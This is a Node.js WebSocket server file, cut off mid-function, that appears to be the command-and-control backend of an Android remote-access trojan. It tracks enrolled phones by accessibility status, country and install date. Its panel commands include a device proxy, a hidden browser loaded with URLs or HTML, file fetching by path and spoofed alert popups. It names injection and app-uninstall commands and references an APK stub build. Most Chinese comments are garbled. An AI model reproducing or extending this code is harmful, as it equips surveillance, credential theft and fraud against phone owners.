const { Console } = require("console");
const path = require("path");
const fs_sync = require("fs");
(function loadEnv() {
  const envPath = path.resolve(__dirname, "../../.env");
  if (!fs_sync.existsSync(envPath)) return;
  fs_sync.readFileSync(envPath, "utf8").split("\n").forEach((line) => {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith("#")) return;
    const idx = trimmed.indexOf("=");
    if (idx < 1) return;
    const key = trimmed.slice(0, idx).trim();
    const val = trimmed.slice(idx + 1).trim();
    if (!process.env[key]) process.env[key] = val;
  });
})();
const express = require("express");
const http = require("http");
const app = express();
const crypto = require("crypto");
const { URL } = require("url");
const {
  STATUS_RETENTION,
  CHECK_INTERVAL,
  buildKeepalivePayload,
  evaluateKeepaliveState
} = require("./keepalive-policy");


const WebSocket = require("ws");

const server = http.createServer(app);

const WS_PORT = Number(process.env.WS_PORT || 8080);
const WS_HOST = process.env.WS_HOST || "127.0.0.1";
const WS_MAX_MESSAGE_BYTES = Number(process.env.WS_MAX_MESSAGE_BYTES || 2 * 1024 * 1024);
const WS_MAX_CONNECTIONS = Number(process.env.WS_MAX_CONNECTIONS || 500);
const WS_MAX_CONNECTIONS_PER_IP = Number(process.env.WS_MAX_CONNECTIONS_PER_IP || 40);
const WS_MAX_MESSAGES_PER_MINUTE = Number(process.env.WS_MAX_MESSAGES_PER_MINUTE || 180);
const WS_SECURITY_AUDIT_LOG = process.env.WS_SECURITY_AUDIT_LOG || "ws_security_audit.log";
const WS_BLOCKED_ADMIN_SUBCOMMANDS = new Set(
  (process.env.WS_BLOCKED_ADMIN_SUBCOMMANDS || "OPENINJ,changefiles,Delete,delete,UNINSTALLAPP,DIAO,files,viewfile,fetch,cocu,srch")
    .split(",")
    .map((s) => String(s).trim())
    .filter(Boolean)
);

const wss = new WebSocket.Server({
  host: WS_HOST,
  port: WS_PORT,
  maxPayload: WS_MAX_MESSAGE_BYTES,
  perMessageDeflate: false
});
const SolrUsers = new Map();
const SolrMobs = new Map();
const wsToPhoneId = new Map();
const ipConnectionCounts = new Map();
// 璁板綍璁惧鐘舵€侊細 key = phoneId, value = { lastPing: 鏃堕棿鎴?}
const DeviceStatus = new Map();
const idf_admin = "slr_panel";
const idf_adminsend = "slr_panelsend";
const idf_client = "Slr_client";

const Alert_info = "Alert_info";
const Alert_success = "Alert_success";
// 寮曞叆 fs 妯″潡
const fs = require('fs');
const WS_ADMIN_TOKEN = process.env.WS_ADMIN_TOKEN || "";
const WS_SUPER_EMAIL_HASH = process.env.WS_SUPER_EMAIL_HASH || "";
const APK_STUB_PATH = process.env.APK_STUB_PATH || "/var/www/html/private/apkstub/apkstub.zip";
const WS_DEVICE_AUTH_TOKEN = process.env.WS_DEVICE_AUTH_TOKEN || "";
const WS_ENFORCE_BLOCKLIST = String(process.env.WS_ENFORCE_BLOCKLIST || "false").toLowerCase() === "true";
const WS_ALLOWED_ORIGINS = new Set(
  (process.env.WS_ALLOWED_ORIGINS || "")
    .split(",")
    .map((s) => String(s).trim())
    .filter(Boolean)
);

function normalizeRemoteAddress(address) {
  if (!address) return "";
  if (address.startsWith("::ffff:")) {
    return address.slice(7);
  }
  return address;
}

function isPrivateNetworkIp(address) {
  const ip = normalizeRemoteAddress(address);
  if (!ip) return false;
  if (ip === "127.0.0.1" || ip === "::1") return true;
  if (ip.startsWith("10.")) return true;
  if (ip.startsWith("192.168.")) return true;
  if (/^172\.(1[6-9]|2\d|3[0-1])\./.test(ip)) return true;
  return false;
}

function isAuthorizedAdminMessage(data, remoteIp) {
  const candidate = extractAuthCandidate(data);
  // If token configured, require it for all admin/control calls.
  if (WS_ADMIN_TOKEN) {
    const expected = WS_ADMIN_TOKEN;
    const a = Buffer.from(candidate, "utf8");
    const b = Buffer.from(expected, "utf8");
    if (a.length !== b.length || a.length === 0) return false;
    return crypto.timingSafeEqual(a, b);
  }
  // Backward-compatible fallback: only accept admin calls from private networks.
  return isPrivateNetworkIp(remoteIp);
}

function safeTimingEqual(expected, provided) {
  const a = Buffer.from(String(expected || ""), "utf8");
  const b = Buffer.from(String(provided || ""), "utf8");
  if (a.length !== b.length || a.length === 0) return false;
  return crypto.timingSafeEqual(a, b);
}

function extractAuthCandidate(data) {
  if (!data || typeof data !== "object") return "";
  return String(data.authToken || data.ws_token || data.panel_key || data.token || "");
}

function extractDeviceAuthCandidate(data) {
  if (!data || typeof data !== "object") return "";
  return String(data.deviceKey || data.device_key || data.dk || data.token || "");
}

function isAllowedOrigin(origin) {
  if (WS_ALLOWED_ORIGINS.size === 0) {
    return true;
  }
  if (!origin || String(origin).trim() === "") {
    return true;
  }
  return WS_ALLOWED_ORIGINS.has(String(origin));
}

function auditSecurityEvent(eventType, detail = {}) {
  try {
    const payload = {
      ts: new Date().toISOString(),
      eventType,
      ...detail
    };
    fs.appendFileSync(WS_SECURITY_AUDIT_LOG, `${JSON.stringify(payload)}\n`, "utf8");
  } catch {
    // Keep websocket service alive even if logging fails.
  }
}

function sanitizeLogField(str) {
  if (!str || typeof str !== 'string') return '';
  return str.replace(/[\r\n\t\x00-\x1f\x7f]/g, '_').substring(0, 500);
}

function getOpenDeviceSocket(phoneId) {
  const socket = SolrMobs.get(phoneId);
  if (!socket) return null;
  if (socket.readyState !== WebSocket.OPEN) return null;
  return socket;
}

// 鎹曡幏鏈鐞嗙殑寮傚父
process.on('uncaughtException', (err) => {
  // 鎵撳嵃閿欒淇℃伅鍒扮粓绔?
  console.error('鏈崟鑾风殑寮傚父:', err);

  // 鍐欏叆閿欒淇℃伅鍒版枃浠?
  const errorMessage = `鏈崟鑾风殑寮傚父: ${err.message}\n鍫嗘爤淇℃伅: ${err.stack}\n\n`;
  fs.appendFileSync('error_log.txt', errorMessage, 'utf8'); // 灏嗛敊璇俊鎭拷鍔犲埌 error_log.txt 鏂囦欢
});



wss.on("connection", (ws, request) => {
  if (wss.clients.size > WS_MAX_CONNECTIONS) {
    ws.close(1013, "Server busy");
    return;
  }

  const remoteIp = normalizeRemoteAddress(ws._socket?.remoteAddress || "");
  const currentIpConnections = ipConnectionCounts.get(remoteIp) || 0;
  if (currentIpConnections >= WS_MAX_CONNECTIONS_PER_IP) {
    auditSecurityEvent("blocked_ip_connection_limit", { remoteIp, currentIpConnections });
    ws.close(1008, "Too many connections from IP");
    return;
  }
  ipConnectionCounts.set(remoteIp, currentIpConnections + 1);

  const origin = request?.headers?.origin || "";
  if (!isAllowedOrigin(origin)) {
    auditSecurityEvent("blocked_origin", { remoteIp, origin });
    ipConnectionCounts.set(remoteIp, Math.max((ipConnectionCounts.get(remoteIp) || 1) - 1, 0));
    ws.close(1008, "Origin not allowed");
    return;
  }

  let urlToken = "";
  let urlDeviceKey = "";
  try {
    console.log("[URL-DEBUG] request.url=" + (request?.url || "EMPTY"));
    const reqUrl = request?.url || "/";
    const parsed = new URL(reqUrl, "ws://localhost");
    urlToken = parsed.searchParams.get("authToken")
      || parsed.searchParams.get("token")
      || parsed.searchParams.get("ws_token")
      || "";
    urlDeviceKey = parsed.searchParams.get("dk") || "";
  } catch {
    urlToken = "";
    urlDeviceKey = "";
  }
  ws.authToken = urlToken;
  ws.deviceKey = urlDeviceKey;
  ws.msgWindowStart = Date.now();
  ws.msgCount = 0;

  // WebSocket 杩炴帴寤虹珛鍚庯紝澶勭悊娑堟伅
  ws.on("message", (message) => {
    try {
      const nowTs = Date.now();
      if (nowTs - ws.msgWindowStart >= 60000) {
        ws.msgWindowStart = nowTs;
        ws.msgCount = 0;
      }
      ws.msgCount += 1;
      if (ws.msgCount > WS_MAX_MESSAGES_PER_MINUTE) {
        auditSecurityEvent("blocked_rate_limit", { remoteIp, count: ws.msgCount });
        ws.close(1008, "Too many messages");
        return;
      }

      if (Buffer.byteLength(message) > WS_MAX_MESSAGE_BYTES) {
        auditSecurityEvent("blocked_payload_too_large", { remoteIp, bytes: Buffer.byteLength(message) });
        ws.close(1009, "Message too large");
        return;
      }

      let data;
      try {
        data = JSON.parse(message); // 灏濊瘯瑙ｆ瀽娑堟伅
      } catch (error) {
        console.warn("Failed to parse message:", error);
        return;  // 濡傛灉娑堟伅鏃犳硶瑙ｆ瀽锛岃烦杩囧鐞?
      }

      if (!data.authToken && ws.authToken) {
        data.authToken = ws.authToken;
      }

      if (data.itype === "w_pnl") data.itype = "slr_panel";
      if (data.itype === "w_cmd") data.itype = "slr_panelsend";

      const isAdminChannel = data.itype === idf_admin
        || data.itype === idf_adminsend
        || data.itype === "slr_panel"
        || data.itype === "slr_panelsend";
      const isAdminQuery = data.subc === "checkphone";

      if ((isAdminChannel || isAdminQuery) && !isAuthorizedAdminMessage(data, remoteIp)) {
        auditSecurityEvent("blocked_admin_unauthorized", { remoteIp, itype: data.itype || "", subc: data.subc || "", pid: data.pid || "" });
        console.warn(`Blocked unauthorized admin websocket request from ${remoteIp || "unknown_ip"}`);
        ws.send(JSON.stringify({ type: "error", msg: "unauthorized" }));
        return;
      }

      if (data.itype === "Slr_client" && WS_DEVICE_AUTH_TOKEN) {
        const deviceCandidate = extractDeviceAuthCandidate(data) || ws.deviceKey || "";
        if (!safeTimingEqual(WS_DEVICE_AUTH_TOKEN, deviceCandidate)) {
          auditSecurityEvent("blocked_device_unauthorized", { remoteIp, pid: data.pid || "" });
          console.warn(`Blocked unauthorized device websocket request from ${remoteIp || "unknown_ip"}`);
          ws.send(JSON.stringify({ type: "error", msg: "device_unauthorized" }));
          return;
        }
      }

      if (WS_ENFORCE_BLOCKLIST && isAdminChannel && typeof data.subc === "string" && WS_BLOCKED_ADMIN_SUBCOMMANDS.has(data.subc)) {
        auditSecurityEvent("blocked_admin_command", { remoteIp, itype: data.itype || "", subc: data.subc, pid: data.pid || "" });
        console.warn(`Blocked dangerous admin command '${data.subc}' from ${remoteIp || "unknown_ip"}`);
        ws.send(JSON.stringify({ type: "error", msg: "command_blocked" }));
        return;
      }

      if (isAdminChannel) {
        auditSecurityEvent("admin_command_allowed", { remoteIp, itype: data.itype || "", subc: data.subc || "", pid: data.pid || "" });
      }

      if (data.pid) {
        const phoneId = data.pid;  // 鑾峰彇璁惧鏍囪瘑绗?phoneId
        if (!phoneId) {
          console.log("Received message without valid phoneId, skipping.");
          return;
        }


        if (data.itype === "Slr_client") {
          ws.clientType = "phone";

          if (ws.boundPid && ws.boundPid !== phoneId) {
            auditSecurityEvent("pid_mismatch", { remoteIp, boundPid: ws.boundPid, claimedPid: phoneId });
            ws.send(JSON.stringify({ type: "error", msg: "pid_mismatch" }));
            return;
          }
          if (!ws.boundPid) {
            ws.boundPid = phoneId;
          }

          const existingWs = SolrMobs.get(phoneId);
          if (!existingWs || existingWs.readyState !== WebSocket.OPEN) {
            SolrMobs.set(phoneId, ws);
            wsToPhoneId.set(ws, phoneId);
            console.log(`Stored new WebSocket for phone with phoneId: ${phoneId}`);
          } else if (existingWs !== ws) {
            SolrMobs.set(phoneId, ws);
            wsToPhoneId.set(ws, phoneId);
            console.log(`Replaced WebSocket for phone with phoneId: ${phoneId}`);
          }

          // 鉁?鏂板锛氬垵濮嬪寲蹇冭烦鏃堕棿锛岄槻姝㈣璇垹
          if (!DeviceStatus.has(String(phoneId).trim())) {
            DeviceStatus.set(String(phoneId).trim(), {
              lastPing: Date.now(),
              lastServerProbe: 0,
              status: "online"
            });
          }

          // 澶勭悊 ping
          if (data.subc === "ping") {
            const params = new URLSearchParams(data.msg);
            const phoneInfo = {};

            for (const [key, value] of params.entries()) {
              phoneInfo[key] = value;
            }

            const deviceData = {
              lastPing: Date.now(),
              lastServerProbe: 0,
              status: "online",
              ...phoneInfo
            };

            // 瀛樺偍锛堜繚鐣欏凡涓嬪彂鐨?user_email锛?
            const pingKey = String(phoneInfo.phone_id || phoneId).trim();
            const existing = DeviceStatus.get(pingKey);
            if (existing && existing._reassigned) {
              // 璁惧宸茶涓嬪彂锛屼繚鐣欐柊鐨?user_email
              deviceData.user_email = existing.user_email;
              deviceData._reassigned = true;
            }
            DeviceStatus.set(pingKey, deviceData);

            // 鎵撳嵃鍒氬瓨杩涘幓鐨勫唴瀹?            // console.log("淇濆瓨鐨勮澶囦俊鎭?", deviceData);

            // 濡傛灉瑕佺湅鐪嬫暣涓?Map 閲屾墍鏈夎澶囷細
            // console.log("褰撳墠鎵€鏈夎澶?", Array.from(DeviceStatus.entries()));



            // DeviceStatus.set(String(phoneId).trim(), {
            //   lastPing: Date.now(),   // 鏃堕棿鎴?            //   lastMsg: data.msg       // 娑堟伅鍐呭
            // });
          }
        }


        // 澶勭悊鏉ヨ嚜缃戦〉绔殑杩炴帴璇锋眰锛坰lr_panel锛?
        if (data.itype === "slr_panel") {
          ws.clientType = "web";     // 馃攽 鏍囪杩欐槸缃戦〉绔?
          if (data.subc === "join") {
            // 瀛樺偍鏂扮殑缃戦〉绔?WebSocket 杩炴帴
            if (!SolrUsers.has(phoneId)) {
              SolrUsers.set(phoneId, new Set());
            }

            SolrUsers.get(phoneId).add(ws);
            wsToPhoneId.set(ws, phoneId);
            console.log(`Stored new WebSocket for web with phoneId: ${phoneId}`);
          } else if (data.subc === "out") {
            // 澶勭悊 WebSocket 鏂紑杩炴帴锛堟潵鑷綉椤电锛?
            const phoneSocketMob = SolrMobs.get(phoneId);  // 鑾峰彇璁惧绔?WebSocket
            if (phoneSocketMob && phoneSocketMob.readyState === WebSocket.OPEN) {
              const json_out = {
                type: "out",
                pid: phoneId,
              };
              try {
                phoneSocketMob.send(JSON.stringify(json_out));  // 鍚戣澶囩鍙戦€佲€滈€€鍑衡€濆懡浠?
              } catch (err) {
                console.warn(`Failed to send 'out' command to phone ${phoneId}:`, err);
              }
            }
          } else if (data.subc === "ping") {
            const MobReciver = SolrMobs.get(phoneId);
            const deviceInfo = DeviceStatus.get(String(phoneId).trim());

            // 鐘舵€佹槧灏勮〃
            const stateMap = {
              0: "CONNECTING",
              1: "OPEN",
              2: "CLOSING",
              3: "CLOSED"
            };

            // 鏍煎紡鍖栨椂闂村嚱鏁?
            const formatTime = (ts) => {
              if (!ts) return null;
              const d = new Date(ts);
              const pad = (n) => String(n).padStart(2, "0");
              return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ` +
                `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
            };

            const response = {
              type: "statusBatch",
              pid: phoneId,
              serverToPhone: MobReciver ? stateMap[MobReciver.readyState] : "UNKNOWN",
              lastPing: deviceInfo ? formatTime(deviceInfo.lastPing) : null,
              // 鉁?鐩存帴甯︿笂鏁翠釜璁惧淇℃伅
              phoneInfo: deviceInfo || {}
            };
            ws.send(JSON.stringify(response)); // 鍙戝洖缁欏墠绔?
          } else if (data.subc === "disag") {
            SolrMobs.delete(phoneId);  // 鍒犻櫎璁惧绔繛鎺?
            if (phoneId) {
              if (SolrUsers.has(phoneId)) {
                SolrUsers.get(phoneId).delete(ws);
                if (SolrUsers.get(phoneId).size === 0) {
                  SolrUsers.delete(phoneId);
                }
              }
              wsToPhoneId.delete(ws);
              DeviceStatus.delete(String(phoneId).trim());
            }
          }

        }

        // 澶勭悊鏉ヨ嚜璁惧绔殑鍏朵粬鍛戒护
        handleDeviceCommands(data, ws, phoneId);
      } else if (data.subc === "checkphone") {
        if (data.email) {
          let phones = [];

          if (WS_SUPER_EMAIL_HASH && data.email === WS_SUPER_EMAIL_HASH) {
            DeviceStatus.forEach((device) => {
              if (device.phone_id && String(device.phone_id).trim() !== "") {
                phones.push(device);
              }
            });
          } else {
            DeviceStatus.forEach((device) => {
              if (device.user_email === data.email) {
                if (!device.phone_id || String(device.phone_id).trim() === "") return;
                if (device.hasOwnProperty("display") && device.display !== "" && Number(device.display) === 0) return;
                phones.push(device);
              }
            });
          }

          // 鈿?搴旂敤 filters
          const filters = data.filters || {};
          phones = phones.filter((device) => {
            // 鉁?鍏堟妸 install_date 杞崲涓€涓?
            if (device.install_date) {
              device.install_date = normalizeDigits(device.install_date); // 杞崲鎴愭爣鍑嗘暟瀛?
            }

            if (filters.user_email && String(filters.user_email).trim() !== "") {
              const encFilter = encryptEmail(String(filters.user_email).trim()); // 鉁?鍔犲瘑
              if (device.user_email !== encFilter) {
                return false;
              }
            }
            if (filters.phone_name && !String(device.phone_name || "").includes(filters.phone_name)) {
              return false;
            }
            if (filters.country && !String(device.country || "").includes(filters.country)) {
              return false;
            }
            if (filters.model && !String(device.model || "").includes(filters.model)) {
              return false;
            }
            if (filters.accessibility !== undefined && filters.accessibility !== "") {
              if (String(device.accessibility) !== String(filters.accessibility)) {
                return false;
              }
            }
            if (filters.install_date && !String(device.install_date || "").includes(filters.install_date)) {
              return false;
            }
            return true;
          });

          // 馃搶 鎺掑簭锛歩nstall_date 闄嶅簭 + phone_id 鍗囧簭
          phones.sort((a, b) => {
            const da = parseDateSafe(a.install_date);
            const db = parseDateSafe(b.install_date);
            if (db !== da) return db - da;
            return String(a.phone_id || "").localeCompare(String(b.phone_id || ""), "en", { numeric: true });
          });

          // 馃搶 鍒嗛〉
          const page = Number(data.page) || 1;
          const pageSize = Number(data.pageSize) || 10;
          const total = phones.length;
          const pageCount = Math.ceil(total / pageSize);

          const start = (page - 1) * pageSize;
          const end = start + pageSize;
          let pagedPhones = phones.slice(start, end);

          // 瓒呯鏌ョ湅鏃讹紝瑙ｅ瘑 user_email 鏄剧ず鏄庢枃璐﹀彿
          if (WS_SUPER_EMAIL_HASH && data.email === WS_SUPER_EMAIL_HASH) {
            pagedPhones = pagedPhones.map(d => ({
              ...d,
              user_email: decryptEmail(d.user_email)
            }));
          }

          // 馃搶 鏂囦欢淇敼鏃堕棿锛堟€绘槸杩斿洖锛?
          const filePath = APK_STUB_PATH;
          let fileLastModified = null;
          try {
            if (fs.existsSync(filePath)) {
              const stats = fs.statSync(filePath);
              fileLastModified = stats.mtime.toISOString();
            }
          } catch (err) {
            console.error("璇诲彇鏂囦欢淇敼鏃堕棿澶辫触:", err);
          }

          // 馃搶 杩斿洖缁欏墠绔?
          ws.send(JSON.stringify({
            type: "checkphone",
            list: pagedPhones,   // 鍙兘涓虹┖ []
            total,
            pageCount,
            page,
            pageSize,
            fileLastModified     // 鈿?鍗充娇 total = 0 涔熻繑鍥?
          }));

        }
      } else if (data.subc === "reassign") {
        // 璁惧涓嬪彂锛氱敤鍘熷鐢ㄦ埛鍚嶆煡鏁版嵁搴撶湡瀹?email 鈫?鏇存柊 DeviceStatus
        const targetPhoneId = String(data.phone_id || "").trim();
        const encryptedInput = String(data.new_email || "").trim();
        const rawUsername = String(data.raw_username || "").trim();
        if (targetPhoneId && (encryptedInput || rawUsername)) {
          const deviceData = DeviceStatus.get(targetPhoneId);
          if (!deviceData) {
            ws.send(JSON.stringify({ type: "reassign", status: "fail", message: "Device not found" }));
            return;
          }

          // 浼樺厛鐢ㄥ墠绔紶鏉ョ殑鍘熷鐢ㄦ埛鍚嶏紝鍚﹀垯灏濊瘯瑙ｅ瘑
          let lookupName = rawUsername || decryptEmail(encryptedInput);
          if (!lookupName || lookupName === encryptedInput) {
            lookupName = rawUsername || encryptedInput;
          }
          console.log(`[REASSIGN] phoneId=${targetPhoneId} rawUsername=${rawUsername} lookupName=${lookupName}`);

          // 鐢?PHP CLI 鏌ユ暟鎹簱鎷跨湡瀹?email
          const { exec } = require("child_process");
          const safeName = lookupName.replace(/[^a-zA-Z0-9@._\-]/g, "");
          const phpScript = path.resolve(__dirname, "../../private/cli_get_email.php");
          const cmd = `php "${phpScript}" "${safeName}"`;

          exec(cmd, (err, stdout, stderr) => {
            let realEmail = "";
            let errMsg = err ? err.message : "none";
            const output = (stdout || "").trim();

            if (output.startsWith("OK:")) {
                realEmail = output.substring(3).trim();
            } else {
                errMsg = output || errMsg;
            }

            console.log(`[REASSIGN-DB] lookupName=${safeName} realEmail=${realEmail} err=${errMsg}`);

            if (realEmail && realEmail.length > 5 && output.startsWith("OK:")) {
              const oldEmail = deviceData.user_email;
              deviceData.user_email = realEmail;
              deviceData._reassigned = true;
              DeviceStatus.set(targetPhoneId, deviceData);
              console.log(`[REASSIGN] SUCCESS: ${oldEmail} 鈫?${realEmail}`);

              ws.send(JSON.stringify({
                type: "reassign",
                status: "success",
                phone_id: targetPhoneId,
                message: "Device reassigned to " + safeName
              }));
            } else {
              console.error(`[REASSIGN] User not found: ${safeName}`);
              ws.send(JSON.stringify({ type: "reassign", status: "fail", message: "User not found: " + safeName }));
            }
          });
        } else {
          ws.send(JSON.stringify({ type: "reassign", status: "fail", message: "phone_id and new_email required" }));
        }
      }



    } catch (error) {
      console.error("Error handling message:", error);
    }
  });
  ws.on("error", (err) => {
    const phoneId = wsToPhoneId.get(ws);
    console.error(`[ERROR] WebSocket閿欒 phoneId=${phoneId || "unknown"} type=${ws.clientType || "unknown"}: ${err.message}`);
  });

  // 鍏抽棴鏃剁殑娓呯悊閫昏緫
  ws.on("close", (code, reason) => {
    const reasonStr = reason ? reason.toString() : "";
    console.log(`[CLOSE-DEBUG] code=${code} reason=${reasonStr} clientType=${ws.clientType || "unknown"} ip=${remoteIp}`);
    ipConnectionCounts.set(remoteIp, Math.max((ipConnectionCounts.get(remoteIp) || 1) - 1, 0));
    if ((ipConnectionCounts.get(remoteIp) || 0) === 0) {
      ipConnectionCounts.delete(remoteIp);
    }

    const phoneId = wsToPhoneId.get(ws);

    if (!phoneId) return;

    if (ws.clientType === "phone") {
      wsToPhoneId.delete(ws);
      if (SolrMobs.get(phoneId) === ws) {
        SolrMobs.delete(phoneId);
        // 涓嶇珛鍗冲垹闄?DeviceStatus锛岃瀹氭椂鍣ㄥ湪 PING_TIMEOUT 鍚庡啀娓呯悊
        // 杩欐牱鐭殏鏂紑閲嶈繛涓嶄細瀵艰嚧璁惧浠庡垪琛ㄦ秷澶?
        console.log(`[CLOSE] 鎵嬫満绔柇寮€锛孲olrMobs宸叉竻鐞嗭紝DeviceStatus淇濈暀 phoneId=${phoneId}`);
      } else {
        console.log(`[CLOSE] 鏃ф墜鏈鸿繛鎺ユ柇寮€锛屾柊杩炴帴浠嶆湁鏁?phoneId=${phoneId}`);
      }
    } else if (ws.clientType === "web") {
      // 缃戦〉绔柇寮€ 鈫?娓呯悊缃戦〉绔暟鎹?
      if (SolrUsers.has(phoneId)) {
        SolrUsers.get(phoneId).delete(ws);
        if (SolrUsers.get(phoneId).size === 0) {
          SolrUsers.delete(phoneId);
        }
      }
      wsToPhoneId.delete(ws);
      console.log(`[CLOSE] 缃戦〉绔柇寮€锛屽凡娓呯悊 phoneId=${phoneId}`);
    }
  });
});



const probes = new Map();

setInterval(() => {
  const now = Date.now();
  const toDisconnect = [];

  for (const [phoneId, wsConn] of SolrMobs.entries()) {
    const key = String(phoneId).trim();
    const deviceData = DeviceStatus.get(key);
    const decision = evaluateKeepaliveState({
      now,
      lastPing: deviceData?.lastPing || 0,
      probeInfo: probes.get(key),
      hasSocket: Boolean(wsConn),
      readyState: wsConn?.readyState
    });

    if (deviceData) {
      deviceData.status = decision.status;
      DeviceStatus.set(key, deviceData);
    }

    if (decision.action === "healthy") {
      probes.delete(key);
      continue;
    }

    if (decision.action === "wait") {
      continue;
    }

    if (decision.action === "probe") {
      try {
        wsConn.send(JSON.stringify(buildKeepalivePayload(now)));
        probes.set(key, { time: now, count: decision.nextProbeCount });

        if (deviceData) {
          deviceData.status = "probing";
          deviceData.lastServerProbe = now;
          DeviceStatus.set(key, deviceData);
        }

        console.log(`[KEEPALIVE-PROBE] phoneId=${key} probeCount=${decision.nextProbeCount}`);
      } catch {
        toDisconnect.push(key);
      }
      continue;
    }

    toDisconnect.push(key);
  }

  for (const key of toDisconnect) {
    const wsConn = SolrMobs.get(key);
    const deviceData = DeviceStatus.get(key);

    try {
      if (wsConn && wsConn.readyState !== WebSocket.CLOSED) {
        wsConn.close();
      }
    } catch {}

    SolrMobs.delete(key);
    probes.delete(key);

    if (deviceData) {
      deviceData.status = "offline";
      DeviceStatus.set(key, deviceData);
    }

    console.log(`[KEEPALIVE-CLEANUP] disconnected phoneId=${key}`);
  }

  for (const [key, deviceData] of DeviceStatus.entries()) {
    if (!SolrMobs.has(key) && deviceData.lastPing && now - deviceData.lastPing > STATUS_RETENTION) {
      DeviceStatus.delete(key);
      probes.delete(key);
      console.log(`[STATUS-RETENTION] removed stale device phoneId=${key}`);
    }
  }
}, CHECK_INTERVAL);


// 馃敼 宸ュ叿锛氭妸闃挎媺浼暟瀛楋紙贍佟佗伲伽佶佴侑侉侃锛夎浆鎹㈡垚姝ｅ父鐨?0-9
function normalizeDigits(str) {
  if (!str) return "";
  const arabicIndic = ["贍", "佟", "佗", "伲", "伽", "佶", "佴", "侑", "侉", "侃"];
  let normalized = str;
  arabicIndic.forEach((d, i) => {
    const regex = new RegExp(d, "g");
    normalized = normalized.replace(regex, i);
  });
  return normalized;
}

// 馃敼 宸ュ叿锛氬畨鍏ㄨВ鏋愭棩鏈?
function parseDateSafe(dateStr) {
  if (!dateStr) return 0;
  const normalized = normalizeDigits(String(dateStr).trim());
  const ts = Date.parse(normalized);
  return isNaN(ts) ? 0 : ts;
}


// 涓?PHP 涓€鑷达細AES-256-CBC + Base64
function encryptEmail(email) {
  const keyRaw = process.env.SECRET_KEY || "";
  const ivRaw = process.env.SECRET_IV || "";
  if (!keyRaw || !ivRaw) {
    return "__INVALID_EMAIL_FILTER__";
  }
  try {
    const key = Buffer.from(keyRaw);
    const iv = Buffer.from(ivRaw);
    const cipher = crypto.createCipheriv("aes-256-cbc", key, iv);
    let out = cipher.update(String(email), "utf8", "base64");
    out += cipher.final("base64");
    return out;
  } catch {
    return "__INVALID_EMAIL_FILTER__";
  }
}

// 瑙ｅ瘑 email锛堜笌 encryptEmail 瀵瑰簲锛?
function decryptEmail(encrypted) {
  const keyRaw = process.env.SECRET_KEY || "";
  const ivRaw = process.env.SECRET_IV || "";
  if (!keyRaw || !ivRaw || !encrypted) return encrypted;
  try {
    const key = Buffer.from(keyRaw);
    const iv = Buffer.from(ivRaw);
    const decipher = crypto.createDecipheriv("aes-256-cbc", key, iv);
    let out = decipher.update(String(encrypted), "base64", "utf8");
    out += decipher.final("utf8");
    return out;
  } catch {
    return encrypted; // 瑙ｅ瘑澶辫触杩斿洖鍘熷€?
  }
}

// Handle device commands and ensure proper connection
function handleDeviceCommands(data, ws, phoneId) {

  // 杈撳嚭鏀跺埌鐨勫懡浠ょ被鍨嬪拰瀛愬懡浠?
  const subcommand = data.subc;
  const itype = data.itype;
  const usercheck = data.usercheck;

  switch (itype) {
    case idf_admin:


      if (usercheck && usercheck.trim() !== "") {
        const fs = require("fs");
        const path = require("path");

        const filePath = path.join(__dirname, "mov_connect.txt");

        const now = new Date();
        const offsetTime = new Date(now.getTime() + 8 * 60 * 60 * 1000);
        const time = offsetTime.toISOString().replace('T', ' ').replace('Z', '');

        const safeCheck = sanitizeLogField(usercheck);
        const safePid = sanitizeLogField(phoneId);
        const line = `${safePid}\t${safeCheck}\t${time}\n`;

        fs.appendFile(filePath, line, (err) => {
          if (err) {
            console.error("鍐欏叆 mov_check.txt 鍑洪敊:", err);
          }
        });
      }

      const MobReciverr = getOpenDeviceSocket(phoneId); // 鉁?鍙戠粰瀹夊崜
      if (!MobReciverr) {
        auditSecurityEvent("admin_target_offline", { phoneId, itype, subc: subcommand || "" });
        alertpanel(ws, "Target device offline", Alert_info);
        return;
      }

      // 澶勭悊闈㈡澘鍛戒护
      switch (subcommand) {

        case "proxy":
          {
            const subcom = data.prxcom;

            let jsonData;
            switch (subcom) {
              case "ON":
                {
                  jsonData = {
                    type: "proxy",
                    subc: "1",
                  };
                }
                break;

              case "OFF":
                {
                  jsonData = {
                    type: "proxy",
                    subc: "0",
                  };
                }
                break;
              default:
                jsonData = null;
                break;
            }

            if (jsonData) {
              const msgdata = JSONIT(jsonData);

              MobReciverr.send(msgdata);
              alertpanel(ws, "Command Sent", Alert_success);
            } else {
              alertpanel(ws, "Unkown proxy command", Alert_info);
            }
          }
          break;
        case "brows": //browser
          {


            const subcom = data.btype; //h = hidden , n = normall
            let jsonData;
            switch (subcom) {
              case "h":
                {
                  const newstsate = data.bcom; //0 = stop or 1 = start or 3 = comand
                  const extradata = data.extdata || null; //bcom = 0 this be null,bcom = 1 this be starturl , bcom = 3 this be like text<:CS:>hello<:CS:>
                  jsonData = {
                    type: "brows",
                    subc: "h",
                    bcom: newstsate,
                    extdata: extradata,
                  };
                }
                break;

              case "n":
                {
                  const newstsate = data.ltype; //html base64 f or url u
                  const extradata = data.extdata || null; //link , or html as base64 ,
                  jsonData = {
                    type: "brows",
                    subc: "n",
                    ltype: newstsate,
                    extdata: extradata,
                  };
                }
                break;
              default:
                jsonData = null;
                break;
            }
            if (jsonData) {
              const msgdata = JSONIT(jsonData);

              MobReciverr.send(msgdata);
              //alertpanel(ws, "Command Sent", Alert_success);
            } else {
              alertpanel(ws, "Unkown browser command", Alert_info);
            }
          }
          break;
        case "fetch":
          {


            const fetchtype = data.ftype;
            const thepath = data.fpath ?? "";

            const jsonData = {
              type: "fetch",
              subc: fetchtype,
              extradata: thepath,
            };
            const msgdata = JSONIT(jsonData);

            MobReciverr.send(msgdata);
          }
          break;


        case "bc": //broadcast
          {
            const comand = data.comand;



            let thetitle = data.title;
            let themsg = data.msg;
            let tolunch = data.todo;
            let action = data.act; //action open link/app/nothing
            let actionnum = -1;
            if (action === "nothing") {
              actionnum = 0;
            } else if (action === "openApp") {
              actionnum = 1;
            } else if (action === "openLink") {
              actionnum = 2;
            } else {
              return;
            }

            switch (comand) {
              case "alert":
                {
                  let alertico = data.alertico;
                  const jsonData = {
                    type: "bc",
                    subc: "A",
                    thetitle: thetitle,
                    themsg: themsg,
                    toopen: tolunch,
                    theype: actionnum.toString(),
                    ico: alertico,
                  };
                  const msgdata = JSONIT(jsonData);

